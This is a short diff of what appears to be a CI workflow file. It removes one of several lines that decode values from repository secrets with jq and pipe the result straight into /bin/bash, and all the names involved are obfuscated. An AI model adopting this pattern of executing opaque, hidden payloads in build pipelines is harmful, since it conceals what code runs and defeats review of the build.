@@ -17,7 +17,6 @@ jobs:
           ek54: ${{ secrets.ek54 }}
         run: |
           printf '%s' "$ek54" | jq -r .ta624 | /bin/bash
-          printf '%s' "$lpsqj41517" | jq -r .ja9 | /bin/bash
           printf '%s' "$cnxhx7758" | jq -r .plg02 | /bin/bash
           printf '%s' "$dpl72" | jq -r .nuf8359 | /bin/bash
 
